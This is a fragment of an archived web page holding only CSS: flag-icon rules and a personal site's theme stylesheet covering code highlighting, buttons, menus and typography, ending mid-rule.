.flag-icon-se.flag-icon-squared { background-image: url("../flags/1x1/se.sv=
g"); }

.flag-icon-sg { background-image: url("../flags/4x3/sg.svg"); }

.flag-icon-sg.flag-icon-squared { background-image: url("../flags/1x1/sg.sv=
g"); }

.flag-icon-sh { background-image: url("../flags/4x3/sh.svg"); }

.flag-icon-sh.flag-icon-squared { background-image: url("../flags/1x1/sh.sv=
g"); }

.flag-icon-si { background-image: url("../flags/4x3/si.svg"); }

.flag-icon-si.flag-icon-squared { background-image: url("../flags/1x1/si.sv=
g"); }

.flag-icon-sj { background-image: url("../flags/4x3/sj.svg"); }

.flag-icon-sj.flag-icon-squared { background-image: url("../flags/1x1/sj.sv=
g"); }

.flag-icon-sk { background-image: url("../flags/4x3/sk.svg"); }

.flag-icon-sk.flag-icon-squared { background-image: url("../flags/1x1/sk.sv=
g"); }

.flag-icon-sl { background-image: url("../flags/4x3/sl.svg"); }

.flag-icon-sl.flag-icon-squared { background-image: url("../flags/1x1/sl.sv=
g"); }

.flag-icon-sm { background-image: url("../flags/4x3/sm.svg"); }

.flag-icon-sm.flag-icon-squared { background-image: url("../flags/1x1/sm.sv=
g"); }

.flag-icon-sn { background-image: url("../flags/4x3/sn.svg"); }

.flag-icon-sn.flag-icon-squared { background-image: url("../flags/1x1/sn.sv=
g"); }

.flag-icon-so { background-image: url("../flags/4x3/so.svg"); }

.flag-icon-so.flag-icon-squared { background-image: url("../flags/1x1/so.sv=
g"); }

.flag-icon-sr { background-image: url("../flags/4x3/sr.svg"); }

.flag-icon-sr.flag-icon-squared { background-image: url("../flags/1x1/sr.sv=
g"); }

.flag-icon-ss { background-image: url("../flags/4x3/ss.svg"); }

.flag-icon-ss.flag-icon-squared { background-image: url("../flags/1x1/ss.sv=
g"); }

.flag-icon-st { background-image: url("../flags/4x3/st.svg"); }

.flag-icon-st.flag-icon-squared { background-image: url("../flags/1x1/st.sv=
g"); }

.flag-icon-sv { background-image: url("../flags/4x3/sv.svg"); }

.flag-icon-sv.flag-icon-squared { background-image: url("../flags/1x1/sv.sv=
g"); }

.flag-icon-sx { background-image: url("../flags/4x3/sx.svg"); }

.flag-icon-sx.flag-icon-squared { background-image: url("../flags/1x1/sx.sv=
g"); }

.flag-icon-sy { background-image: url("../flags/4x3/sy.svg"); }

.flag-icon-sy.flag-icon-squared { background-image: url("../flags/1x1/sy.sv=
g"); }

.flag-icon-sz { background-image: url("../flags/4x3/sz.svg"); }

.flag-icon-sz.flag-icon-squared { background-image: url("../flags/1x1/sz.sv=
g"); }

.flag-icon-tc { background-image: url("../flags/4x3/tc.svg"); }

.flag-icon-tc.flag-icon-squared { background-image: url("../flags/1x1/tc.sv=
g"); }

.flag-icon-td { background-image: url("../flags/4x3/td.svg"); }

.flag-icon-td.flag-icon-squared { background-image: url("../flags/1x1/td.sv=
g"); }

.flag-icon-tf { background-image: url("../flags/4x3/tf.svg"); }

.flag-icon-tf.flag-icon-squared { background-image: url("../flags/1x1/tf.sv=
g"); }

.flag-icon-tg { background-image: url("../flags/4x3/tg.svg"); }

.flag-icon-tg.flag-icon-squared { background-image: url("../flags/1x1/tg.sv=
g"); }

.flag-icon-th { background-image: url("../flags/4x3/th.svg"); }

.flag-icon-th.flag-icon-squared { background-image: url("../flags/1x1/th.sv=
g"); }

.flag-icon-tj { background-image: url("../flags/4x3/tj.svg"); }

.flag-icon-tj.flag-icon-squared { background-image: url("../flags/1x1/tj.sv=
g"); }

.flag-icon-tk { background-image: url("../flags/4x3/tk.svg"); }

.flag-icon-tk.flag-icon-squared { background-image: url("../flags/1x1/tk.sv=
g"); }

.flag-icon-tl { background-image: url("../flags/4x3/tl.svg"); }

.flag-icon-tl.flag-icon-squared { background-image: url("../flags/1x1/tl.sv=
g"); }

.flag-icon-tm { background-image: url("../flags/4x3/tm.svg"); }

.flag-icon-tm.flag-icon-squared { background-image: url("../flags/1x1/tm.sv=
g"); }

.flag-icon-tn { background-image: url("../flags/4x3/tn.svg"); }

.flag-icon-tn.flag-icon-squared { background-image: url("../flags/1x1/tn.sv=
g"); }

.flag-icon-to { background-image: url("../flags/4x3/to.svg"); }

.flag-icon-to.flag-icon-squared { background-image: url("../flags/1x1/to.sv=
g"); }

.flag-icon-tr { background-image: url("../flags/4x3/tr.svg"); }

.flag-icon-tr.flag-icon-squared { background-image: url("../flags/1x1/tr.sv=
g"); }

.flag-icon-tt { background-image: url("../flags/4x3/tt.svg"); }

.flag-icon-tt.flag-icon-squared { background-image: url("../flags/1x1/tt.sv=
g"); }

.flag-icon-tv { background-image: url("../flags/4x3/tv.svg"); }

.flag-icon-tv.flag-icon-squared { background-image: url("../flags/1x1/tv.sv=
g"); }

.flag-icon-tw { background-image: url("../flags/4x3/tw.svg"); }

.flag-icon-tw.flag-icon-squared { background-image: url("../flags/1x1/tw.sv=
g"); }

.flag-icon-tz { background-image: url("../flags/4x3/tz.svg"); }

.flag-icon-tz.flag-icon-squared { background-image: url("../flags/1x1/tz.sv=
g"); }

.flag-icon-ua { background-image: url("../flags/4x3/ua.svg"); }

.flag-icon-ua.flag-icon-squared { background-image: url("../flags/1x1/ua.sv=
g"); }

.flag-icon-ug { background-image: url("../flags/4x3/ug.svg"); }

.flag-icon-ug.flag-icon-squared { background-image: url("../flags/1x1/ug.sv=
g"); }

.flag-icon-um { background-image: url("../flags/4x3/um.svg"); }

.flag-icon-um.flag-icon-squared { background-image: url("../flags/1x1/um.sv=
g"); }

.flag-icon-us { background-image: url("../flags/4x3/us.svg"); }

.flag-icon-us.flag-icon-squared { background-image: url("../flags/1x1/us.sv=
g"); }

.flag-icon-uy { background-image: url("../flags/4x3/uy.svg"); }

.flag-icon-uy.flag-icon-squared { background-image: url("../flags/1x1/uy.sv=
g"); }

.flag-icon-uz { background-image: url("../flags/4x3/uz.svg"); }

.flag-icon-uz.flag-icon-squared { background-image: url("../flags/1x1/uz.sv=
g"); }

.flag-icon-va { background-image: url("../flags/4x3/va.svg"); }

.flag-icon-va.flag-icon-squared { background-image: url("../flags/1x1/va.sv=
g"); }

.flag-icon-vc { background-image: url("../flags/4x3/vc.svg"); }

.flag-icon-vc.flag-icon-squared { background-image: url("../flags/1x1/vc.sv=
g"); }

.flag-icon-ve { background-image: url("../flags/4x3/ve.svg"); }

.flag-icon-ve.flag-icon-squared { background-image: url("../flags/1x1/ve.sv=
g"); }

.flag-icon-vg { background-image: url("../flags/4x3/vg.svg"); }

.flag-icon-vg.flag-icon-squared { background-image: url("../flags/1x1/vg.sv=
g"); }

.flag-icon-vi { background-image: url("../flags/4x3/vi.svg"); }

.flag-icon-vi.flag-icon-squared { background-image: url("../flags/1x1/vi.sv=
g"); }

.flag-icon-vn { background-image: url("../flags/4x3/vn.svg"); }

.flag-icon-vn.flag-icon-squared { background-image: url("../flags/1x1/vn.sv=
g"); }

.flag-icon-vu { background-image: url("../flags/4x3/vu.svg"); }

.flag-icon-vu.flag-icon-squared { background-image: url("../flags/1x1/vu.sv=
g"); }

.flag-icon-wf { background-image: url("../flags/4x3/wf.svg"); }

.flag-icon-wf.flag-icon-squared { background-image: url("../flags/1x1/wf.sv=
g"); }

.flag-icon-ws { background-image: url("../flags/4x3/ws.svg"); }

.flag-icon-ws.flag-icon-squared { background-image: url("../flags/1x1/ws.sv=
g"); }

.flag-icon-ye { background-image: url("../flags/4x3/ye.svg"); }

.flag-icon-ye.flag-icon-squared { background-image: url("../flags/1x1/ye.sv=
g"); }

.flag-icon-yt { background-image: url("../flags/4x3/yt.svg"); }

.flag-icon-yt.flag-icon-squared { background-image: url("../flags/1x1/yt.sv=
g"); }

.flag-icon-za { background-image: url("../flags/4x3/za.svg"); }

.flag-icon-za.flag-icon-squared { background-image: url("../flags/1x1/za.sv=
g"); }

.flag-icon-zm { background-image: url("../flags/4x3/zm.svg"); }

.flag-icon-zm.flag-icon-squared { background-image: url("../flags/1x1/zm.sv=
g"); }

.flag-icon-zw { background-image: url("../flags/4x3/zw.svg"); }

.flag-icon-zw.flag-icon-squared { background-image: url("../flags/1x1/zw.sv=
g"); }

.flag-icon-es-ca { background-image: url("../flags/4x3/es-ca.svg"); }

.flag-icon-es-ca.flag-icon-squared { background-image: url("../flags/1x1/es=
-ca.svg"); }

.flag-icon-es-ga { background-image: url("../flags/4x3/es-ga.svg"); }

.flag-icon-es-ga.flag-icon-squared { background-image: url("../flags/1x1/es=
-ga.svg"); }

.flag-icon-eu { background-image: url("../flags/4x3/eu.svg"); }

.flag-icon-eu.flag-icon-squared { background-image: url("../flags/1x1/eu.sv=
g"); }

.flag-icon-gb-eng { background-image: url("../flags/4x3/gb-eng.svg"); }

.flag-icon-gb-eng.flag-icon-squared { background-image: url("../flags/1x1/g=
b-eng.svg"); }

.flag-icon-gb-nir { background-image: url("../flags/4x3/gb-nir.svg"); }

.flag-icon-gb-nir.flag-icon-squared { background-image: url("../flags/1x1/g=
b-nir.svg"); }

.flag-icon-gb-sct { background-image: url("../flags/4x3/gb-sct.svg"); }

.flag-icon-gb-sct.flag-icon-squared { background-image: url("../flags/1x1/g=
b-sct.svg"); }

.flag-icon-gb-wls { background-image: url("../flags/4x3/gb-wls.svg"); }

.flag-icon-gb-wls.flag-icon-squared { background-image: url("../flags/1x1/g=
b-wls.svg"); }

.flag-icon-un { background-image: url("../flags/4x3/un.svg"); }

.flag-icon-un.flag-icon-squared { background-image: url("../flags/1x1/un.sv=
g"); }

.flag-icon-xk { background-image: url("../flags/4x3/xk.svg"); }

.flag-icon-xk.flag-icon-squared { background-image: url("../flags/1x1/xk.sv=
g"); }
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://casvancooten.com/main.2a064c455b0ecbd6b1481b3bf9df2441e95838691022f40a5338c2cb1244f075.css

@charset "utf-8";

::-webkit-scrollbar { width: 8px; height: 8px; background: rgb(33, 32, 32);=
 }

::-webkit-scrollbar-thumb { background: rgb(136, 136, 136); }

::-webkit-scrollbar-thumb:hover { background: rgb(220, 220, 220); }

html { line-height: 1.15; text-size-adjust: 100%; }

body { margin: 0px; }

main { display: block; }

h1 { font-size: 2em; margin: 0.67em 0px; }

hr { box-sizing: content-box; height: 0px; overflow: visible; }

pre { font-family: monospace, monospace; font-size: 1em; }

a { background-color: transparent; }

abbr[title] { border-bottom: none; text-decoration: underline dotted; }

b, strong { font-weight: bolder; }

code, kbd, samp { font-family: monospace, monospace; font-size: 1em; }

small { font-size: 80%; }

sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-ali=
gn: baseline; }

sub { bottom: -0.25em; }

sup { top: -0.5em; }

img { border-style: none; }

button, input, optgroup, select, textarea { font-family: inherit; font-size=
: 100%; line-height: 1.15; margin: 0px; }

button, input { overflow: visible; }

button, select { text-transform: none; }

button, [type=3D"button"], [type=3D"reset"], [type=3D"submit"] { appearance=
: button; }

fieldset { padding: 0.35em 0.75em 0.625em; }

legend { box-sizing: border-box; color: inherit; display: table; max-width:=
 100%; padding: 0px; white-space: normal; }

progress { vertical-align: baseline; }

textarea { overflow: auto; }

[type=3D"checkbox"], [type=3D"radio"] { box-sizing: border-box; padding: 0p=
x; }

[type=3D"number"]::-webkit-inner-spin-button, [type=3D"number"]::-webkit-ou=
ter-spin-button { height: auto; }

[type=3D"search"] { appearance: textfield; outline-offset: -2px; }

[type=3D"search"]::-webkit-search-decoration { appearance: none; }

::-webkit-file-upload-button { appearance: button; font: inherit; }

details { display: block; }

summary { display: list-item; }

template { display: none; }

[hidden] { display: none; }

code[class*=3D"language-"], pre[class*=3D"language-"] { color: white; backg=
round: none; font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", m=
onospace; font-size: 1em; text-align: left; text-shadow: black 0px -0.1em 0=
.2em; white-space: pre; word-spacing: normal; word-break: normal; overflow-=
wrap: normal; line-height: 1.5; tab-size: 4; hyphens: none; }

pre[class*=3D"language-"], :not(pre) > code[class*=3D"language-"] { backgro=
und: rgb(20, 20, 20); }

pre[class*=3D"language-"] { border-radius: 0.5em; border: 0.3em solid rgb(8=
4, 84, 84); box-shadow: black 1px 1px 0.5em inset; margin: 0.5em 0px; overf=
low: auto; padding: 1em; }

pre[class*=3D"language-"]::selection { background: rgb(39, 41, 42); }

pre[class*=3D"language-"]::selection, pre[class*=3D"language-"] ::selection=
, code[class*=3D"language-"]::selection, code[class*=3D"language-"] ::selec=
tion { text-shadow: none; background: rgba(237, 237, 237, 0.15); }

:not(pre) > code[class*=3D"language-"] { border-radius: 0.3em; border: 0.13=
em solid rgb(84, 84, 84); box-shadow: black 1px 1px 0.3em -0.1em inset; pad=
ding: 0.15em 0.2em 0.05em; white-space: normal; }

.token.comment, .token.prolog, .token.doctype, .token.cdata { color: rgb(12=
0, 120, 120); }

.token.punctuation { opacity: 0.7; }

.token.namespace { opacity: 0.7; }

.token.tag, .token.boolean, .token.number, .token.deleted { color: rgb(207,=
 105, 74); }

.token.keyword, .token.property, .token.selector, .token.constant, .token.s=
ymbol, .token.builtin { color: rgb(249, 238, 154); }

.token.attr-name, .token.attr-value, .token.string, .token.char, .token.ope=
rator, .token.entity, .token.url, .language-css .token.string, .style .toke=
n.string, .token.variable, .token.inserted { color: rgb(145, 158, 107); }

.token.atrule { color: rgb(115, 134, 165); }

.token.regex, .token.important { color: rgb(233, 193, 99); }

.token.important, .token.bold { font-weight: bold; }

.token.italic { font-style: italic; }

.token.entity { cursor: help; }

pre[data-line] { padding: 1em 0px 1em 3em; position: relative; }

.language-markup .token.tag, .language-markup .token.attr-name, .language-m=
arkup .token.punctuation { color: rgb(173, 137, 92); }

.token { position: relative; z-index: 1; }

.line-highlight { background: linear-gradient(to right, rgba(84, 84, 84, 0.=
1) 70%, rgba(84, 84, 84, 0)); border-bottom: 1px dashed rgb(84, 84, 84); bo=
rder-top: 1px dashed rgb(84, 84, 84); left: 0px; line-height: inherit; marg=
in-top: 0.75em; pointer-events: none; position: absolute; right: 0px; white=
-space: pre; z-index: 0; }

.line-highlight::before, .line-highlight[data-end]::after { background-colo=
r: rgb(135, 148, 166); border-radius: 999px; box-shadow: white 0px 1px; col=
or: rgb(245, 242, 240); content: attr(data-start); font: bold 65% / 1.5 san=
s-serif; left: 0.6em; min-width: 1em; padding: 0px 0.5em; position: absolut=
e; text-align: center; text-shadow: none; top: 0.4em; vertical-align: 0.3em=
; }

.line-highlight[data-end]::after { bottom: 0.4em; content: attr(data-end); =
top: auto; }

pre[data-line] { position: relative; padding: 1em 0px 1em 3em; }

.line-highlight { position: absolute; left: 0px; right: 0px; margin-top: 1e=
m; background: linear-gradient(to right, rgba(153, 122, 102, 0.1) 70%, rgba=
(153, 122, 102, 0)); pointer-events: none; line-height: inherit; white-spac=
e: pre; }

@media print {
  .line-highlight { -webkit-print-color-adjust: exact; }
}

.line-highlight::before, .line-highlight[data-end]::after { content: attr(d=
ata-start); position: absolute; top: 0.4em; left: 0.6em; min-width: 1em; pa=
dding: 0px 0.5em; background-color: rgba(153, 122, 102, 0.4); color: rgb(24=
5, 242, 240); font: bold 65% / 1.5 sans-serif; text-align: center; vertical=
-align: 0.3em; border-radius: 999px; text-shadow: none; box-shadow: white 0=
px 1px; }

.line-highlight[data-end]::after { content: attr(data-end); top: auto; bott=
om: 0.4em; }

.line-numbers .line-highlight::before, .line-numbers .line-highlight::after=
 { content: none; }

pre[id].linkable-line-numbers span.line-numbers-rows { pointer-events: all;=
 }

pre[id].linkable-line-numbers span.line-numbers-rows > span::before { curso=
r: pointer; }

pre[id].linkable-line-numbers span.line-numbers-rows > span:hover::before {=
 background-color: rgba(128, 128, 128, 0.2); }

pre[class*=3D"language-"].line-numbers { position: relative; padding-left: =
3.8em; counter-reset: linenumber 0; }

pre[class*=3D"language-"].line-numbers > code { position: relative; white-s=
pace: inherit; }

.line-numbers .line-numbers-rows { position: absolute; pointer-events: none=
; top: 0px; font-size: 100%; left: -3.8em; width: 3em; letter-spacing: -1px=
; border-right: 1px solid rgb(153, 153, 153); user-select: none; }

.line-numbers-rows > span { display: block; counter-increment: linenumber 1=
; }

.line-numbers-rows > span::before { content: counter(linenumber); color: rg=
b(153, 153, 153); display: block; padding-right: 0.8em; text-align: right; =
}

div.code-toolbar { position: relative; }

div.code-toolbar > .toolbar { position: absolute; top: 0.3em; right: 0.2em;=
 transition: opacity 0.3s ease-in-out 0s; opacity: 0; }

div.code-toolbar:hover > .toolbar { opacity: 1; }

div.code-toolbar:focus-within > .toolbar { opacity: 1; }

div.code-toolbar > .toolbar .toolbar-item { display: inline-block; }

div.code-toolbar > .toolbar a { cursor: pointer; }

div.code-toolbar > .toolbar button { background: none; border: 0px; color: =
inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; =
font-stretch: inherit; font-size: inherit; font-family: inherit; font-optic=
al-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; =
font-variation-settings: inherit; line-height: normal; overflow: visible; p=
adding: 0px; user-select: none; }

div.code-toolbar > .toolbar a, div.code-toolbar > .toolbar button, div.code=
-toolbar > .toolbar span { color: rgb(187, 187, 187); font-size: 0.8em; pad=
ding: 0px 0.5em; background: rgba(224, 224, 224, 0.2); box-shadow: rgba(0, =
0, 0, 0.2) 0px 2px 0px 0px; border-radius: 0.5em; }

div.code-toolbar > .toolbar a:hover, div.code-toolbar > .toolbar a:focus, d=
iv.code-toolbar > .toolbar button:hover, div.code-toolbar > .toolbar button=
:focus, div.code-toolbar > .toolbar span:hover, div.code-toolbar > .toolbar=
 span:focus { color: inherit; text-decoration: none; }

:root { --phoneWidth: (max-width: 684px); --tabletWidth: (max-width: 900px)=
; }

@font-face { font-family: Inter; font-style: normal; font-display: auto; fo=
nt-weight: 400; src: url("../fonts/Inter-Regular.woff2") format("woff2"), u=
rl("../fonts/Inter-Regular.woff") format("woff"); }

@font-face { font-family: Inter; font-style: italic; font-display: auto; fo=
nt-weight: 400; src: url("../fonts/Inter-Italic.woff2") format("woff2"), ur=
l("../fonts/Inter-Italic.woff") format("woff"); }

@font-face { font-family: Inter; font-style: normal; font-display: auto; fo=
nt-weight: 600; src: url("../fonts/Inter-Medium.woff2") format("woff2"), ur=
l("../fonts/Inter-Medium.woff") format("woff"); }

@font-face { font-family: Inter; font-style: italic; font-display: auto; fo=
nt-weight: 600; src: url("../fonts/Inter-MediumItalic.woff2") format("woff2=
"), url("../fonts/Inter-MediumItalic.woff") format("woff"); }

@font-face { font-family: Inter; font-style: normal; font-display: auto; fo=
nt-weight: 800; src: url("../fonts/Inter-Bold.woff2") format("woff2"), url(=
"../fonts/Inter-Bold.woff") format("woff"); }

@font-face { font-family: Inter; font-style: italic; font-display: auto; fo=
nt-weight: 800; src: url("../fonts/Inter-BoldItalic.woff2") format("woff2")=
, url("../fonts/Inter-BoldItalic.woff") format("woff"); }

.button-container { display: table; margin-left: auto; margin-right: auto; =
}

button, .button, a.button { position: relative; display: flex; align-items:=
 center; justify-content: center; padding: 8px 18px; margin-bottom: 5px; te=
xt-decoration: none; text-align: center; font-weight: 500; border-radius: 8=
px; border: 1px solid transparent; appearance: none; cursor: pointer; outli=
ne: none; background: rgb(250, 250, 250); }

@media (prefers-color-scheme: dark) {
  button, .button, a.button { background: rgb(27, 28, 29); color: inherit; =
}
}

@media (prefers-color-scheme: light) {
  button, .button, a.button { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] button, [data-theme=3D"dark"] .button, [data-theme=3D=
"dark"] a.button { background: rgb(27, 28, 29); color: inherit; }

[data-theme=3D"light"] button, [data-theme=3D"light"] .button, [data-theme=
=3D"light"] a.button { background: rgb(250, 250, 250); }

button.outline, .button.outline, a.button.outline { background: transparent=
; box-shadow: none; padding: 8px 18px; border-color: rgb(234, 234, 234); }

@media (prefers-color-scheme: dark) {
  button.outline, .button.outline, a.button.outline { border-color: rgb(59,=
 61, 66); color: inherit; }
}

@media (prefers-color-scheme: light) {
  button.outline, .button.outline, a.button.outline { border-color: rgb(234=
, 234, 234); }
}

[data-theme=3D"dark"] button.outline, [data-theme=3D"dark"] .button.outline=
, [data-theme=3D"dark"] a.button.outline { border-color: rgb(59, 61, 66); c=
olor: inherit; }

[data-theme=3D"light"] button.outline, [data-theme=3D"light"] .button.outli=
ne, [data-theme=3D"light"] a.button.outline { border-color: rgb(234, 234, 2=
34); }

button.outline :hover, .button.outline :hover, a.button.outline :hover { tr=
ansform: none; box-shadow: none; }

button.primary, .button.primary, a.button.primary { box-shadow: rgba(50, 50=
, 93, 0.11) 0px 4px 6px, rgba(0, 0, 0, 0.08) 0px 1px 3px; }

button.primary:hover, .button.primary:hover, a.button.primary:hover { box-s=
hadow: rgba(50, 50, 93, 0.21) 0px 2px 6px, rgba(0, 0, 0, 0.08) 0px 1px 3px;=
 }

button.link, .button.link, a.button.link { background: none; font-size: 1re=
m; }

button.small, .button.small, a.button.small { font-size: 0.8rem; }

button.wide, .button.wide, a.button.wide { min-width: 200px; padding: 14px =
24px; }

.code-toolbar { margin-bottom: 20px; }

.code-toolbar .toolbar-item a { position: relative; display: inline-flex; a=
lign-items: center; justify-content: center; padding: 3px 8px; margin-botto=
m: 5px; text-decoration: none; text-align: center; font-size: 13px; font-we=
ight: 500; border-radius: 8px; border: 1px solid transparent; appearance: n=
one; cursor: pointer; outline: none; background: rgb(234, 234, 234); }

@media (prefers-color-scheme: dark) {
  .code-toolbar .toolbar-item a { background: rgb(59, 61, 66); color: inher=
it; }
}

@media (prefers-color-scheme: light) {
  .code-toolbar .toolbar-item a { background: rgb(234, 234, 234); }
}

[data-theme=3D"dark"] .code-toolbar .toolbar-item a { background: rgb(59, 6=
1, 66); color: inherit; }

[data-theme=3D"light"] .code-toolbar .toolbar-item a { background: rgb(234,=
 234, 234); }

.header { display: flex; align-items: center; justify-content: center; posi=
tion: relative; padding: 20px; background: rgb(250, 250, 250); }

@media (prefers-color-scheme: dark) {
  .header { background: rgb(27, 28, 29); }
}

@media (prefers-color-scheme: light) {
  .header { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] .header { background: rgb(27, 28, 29); }

[data-theme=3D"light"] .header { background: rgb(250, 250, 250); }

.header__right { display: flex; flex-direction: row; align-items: center; }

@media (max-width: 684px) {
  .header__right { flex-direction: row-reverse; }
}

.header__inner { display: flex; align-items: center; justify-content: space=
-between; margin: 0px auto; width: 760px; max-width: 100%; }

.theme-toggle { display: flex; align-items: center; justify-content: center=
; line-height: 1; cursor: pointer; }

.theme-toggler { fill: currentcolor; }

.not-selectable { user-select: none; }

.logo { display: flex; align-items: center; text-decoration: none; font-wei=
ght: bold; font-family: monospace, monospace; }

.logo img { height: 44px; }

.logo__mark { margin-right: 5px; }

.logo__text { font-size: 1.125rem; white-space: nowrap; }

.logo__cursor { display: inline-block; width: 10px; height: 1rem; backgroun=
d: rgb(254, 81, 134); margin-left: 5px; border-radius: 1px; animation: 1s e=
ase 0s infinite normal none running cursor; }

@media (prefers-reduced-motion: reduce) {
  .logo__cursor { animation: 0s ease 0s 1 normal none running none; }
}

@keyframes cursor {=20
  0% { opacity: 0; }
  50% { opacity: 1; }
  100% { opacity: 0; }
}

.menu { z-index: 9999; background: rgb(250, 250, 250); }

@media (prefers-color-scheme: dark) {
  .menu { background: rgb(27, 28, 29); }
}

@media (prefers-color-scheme: light) {
  .menu { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] .menu { background: rgb(27, 28, 29); }

[data-theme=3D"light"] .menu { background: rgb(250, 250, 250); }

@media (max-width: 684px) {
  .menu { position: absolute; top: 50px; right: 0px; border: none; margin: =
0px; padding: 10px; }
}

.menu__inner { display: flex; align-items: center; justify-content: flex-st=
art; max-width: 100%; margin: 0px auto; padding: 0px 15px; font-size: 1rem;=
 list-style: none; }

.menu__inner li { margin: 0px 12px; }

@media (max-width: 684px) {
  .menu__inner { flex-direction: column; align-items: flex-start; padding: =
0px; }
  .menu__inner li { margin: 0px; padding: 5px; }
}

.menu-trigger { width: 24px; height: 24px; fill: currentcolor; margin-left:=
 10px; cursor: pointer; display: none; }

@media (max-width: 684px) {
  .menu-trigger { display: block; }
}

.menu a { display: inline-block; margin-right: 15px; text-decoration: none;=
 }

.menu a:hover { text-decoration: underline; }

.menu a:last-of-type { margin-right: 0px; }

.submenu { background: rgb(250, 250, 250); }

@media (prefers-color-scheme: dark) {
  .submenu { background: rgb(27, 28, 29); }
}

@media (prefers-color-scheme: light) {
  .submenu { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] .submenu { background: rgb(27, 28, 29); }

[data-theme=3D"light"] .submenu { background: rgb(250, 250, 250); }

.submenu ul { list-style-type: none; margin: 0px; padding: 0px; overflow: h=
idden; }

.submenu li a, .submenu .dropbtn { display: inline-block; text-decoration: =
none; }

.submenu li.dropdown { display: inline-block; }

.submenu .dropdown-content { display: none; position: absolute; background:=
 rgb(27, 28, 29); }

@media (prefers-color-scheme: light) {
  .submenu .dropdown-content { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] .submenu .dropdown-content { background: rgb(27, 28, =
29); }

[data-theme=3D"light"] .submenu .dropdown-content { background: rgb(250, 25=
0, 250); }

.submenu .dropdown-content a { padding: 12px 20px; text-decoration: none; d=
isplay: block; text-align: left; }

.submenu .dropdown-content a:hover { background: rgb(27, 28, 29); }

@media (prefers-color-scheme: light) {
  .submenu .dropdown-content a:hover { background: rgb(250, 250, 250); }
}

[data-theme=3D"dark"] .submenu .dropdown-content a:hover { background: rgb(=
27, 28, 29); }

[data-theme=3D"light"] .submenu .dropdown-content a:hover { background: rgb=
(250, 250, 250); }

.submenu .dropdown:hover .dropdown-content { display: block; }

html { box-sizing: border-box; line-height: 1.6; letter-spacing: 0.06em; sc=
roll-behavior: smooth; }

*, ::before, ::after { box-sizing: inherit; }

body { margin: 0px; padding: 0px; font-family: Inter, -apple-system, BlinkM=
acSystemFont, Roboto, "Segoe UI", Helvetica, Arial, sans-serif; font-size: =
1rem; line-height: 1.54; text-rendering: optimizelegibility; -webkit-font-s=
moothing: antialiased; font-feature-settings: "liga", "tnum", "case", "calt=
", "zero", "ss01", "locl"; text-size-adjust: 100%; display: flex; min-heigh=
t: 100vh; flex-direction: column; background-color: rgb(255, 255, 255); col=
or: rgb(34, 34, 34); }

@media (max-width: 684px) {
  body { font-size: 1rem; }
}

@media (prefers-color-scheme: dark) {
  body { background-color: rgb(35, 36, 37); color: rgb(169, 169, 179); }
}

@media (prefers-color-scheme: light) {
  body { background-color: rgb(255, 255, 255); color: rgb(34, 34, 34); }
}

[data-theme=3D"dark"] body { background-color: rgb(35, 36, 37); color: rgb(=
169, 169, 179); }

[data-theme=3D"light"] body { background-color: rgb(255, 255, 255); color: =
rgb(34, 34, 34); }

h2, h3, h4, h5, h6 { display: flex; align-items: center; line-height: 1.3; =
}

h1 { font-size: 2.625rem; }

h2 { font-size: 1.625rem; margin-top: 2.5em; }

h3 { font-size: 1.375rem; }

h4 { font-size: 1.125rem; }

@media (max-width: 684px) {
  h1 { font-size: 2rem; }
  h2 { font-size: 1.4rem; }
  h3 { font-size: 1.15rem; }
  h4 { font-size: 1.125rem; }
}

a { color: inherit; }

img { display: block; max-width: 100%; }

img.left { margin-right: auto; }

img.center { margin-left: auto; margin-right: auto; }

img.right { margin-left: auto; }

img.circle { border-radius: 50%; max-width: 25%; margin: auto; }

figure { display: table; max-width: 100%; margin: 25px 0px; }

figure.left { margin-right: auto; }

figure.left-floated { margin-right: auto; float: left; }

figure.left-floated img { margin: 20px 20px 20px 0px; }

figure.center { margin-left: auto; margin-right: auto; }

figure.right { margin-left: auto; }

figure.right-floated { margin-left: auto; float: right; }

figure.right-floated img { margin: 20px 0px 20px 20px; }

figure.rounded img { border-radius: 50%; }

figure figcaption { font-size: 14px; margin-top: 5px; opacity: 0.8; }

figure figcaption.left { text-align: left; }

figure figcaption.center { text-align: center; }

figure figcaption.right { text-align: right; }

em, i, strong { color: rgb(0, 0, 0); }

@media (prefers-color-scheme: dark) {
  em, i, strong { color: rgb(255, 255, 255); }
}

@media (prefers-color-scheme: light) {
  em, i, strong { color: rgb(0, 0, 0); }
}

[data-theme=3D"dark"] em, [data-theme=3D"dark"] i, [data-theme=3D"dark"] st=
rong { color: white; }

[data-theme=3D"light"] em, [data-theme=3D"light"] i, [data-theme=3D"light"]=
 strong { color: black; }

code { font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospa=
ce; font-feature-settings: normal; padding: 1px 6px; margin: 0px 2px; borde=
r-radius: 5px; font-size: 0.95rem; background: rgb(234, 234, 234); }

@media (prefers-color-scheme: dark) {
  code { background: rgb(59, 61, 66); }
}

@media (prefers-color-scheme: light) {
  code { background: rgb(234, 234, 234); }
}

[data-theme=3D"dark"] code { background: rgb(59, 61, 66); }

[data-theme=3D"light"] code { background: rgb(234, 234, 234); }

pre { padding: 10px 10px 10px 20px; border-radius: 8px; font-size: 0.95rem;=
 overflow: auto; }

[data-theme=3D"dark"] pre { background-color: rgb(59, 61, 66); }

[data-theme=3D"light"] pre { background-color: rgb(234, 234, 234); }

@media (max-width: 684px) {
  pre { white-space: pre-wrap; overflow-wrap: break-word; }
}

pre code { margin: 0px; padding: 0px; font-size: inherit; color: rgb(204, 2=
04, 204); background: none !important; }

@media (prefers-color-scheme: dark) {
  pre code { color: inherit; }
}

@media (prefers-color-scheme: light) {
  pre code { color: rgb(204, 204, 204); }
}

[data-theme=3D"dark"] pre code { color: inherit; }

[data-theme=3D"light"] pre code { color: rgb(204, 204, 204); }

blockquote { border-left: 3px solid rgb(62, 176, 239); margin: 40px; paddin=
g: 10px 20px; }

@media (max-width: 684px) {
  blockquote { margin: 10px; padding: 10px; }
}

blockquote::before { content: "=E2=80=9D"; font-family: Georgia, serif; fon=
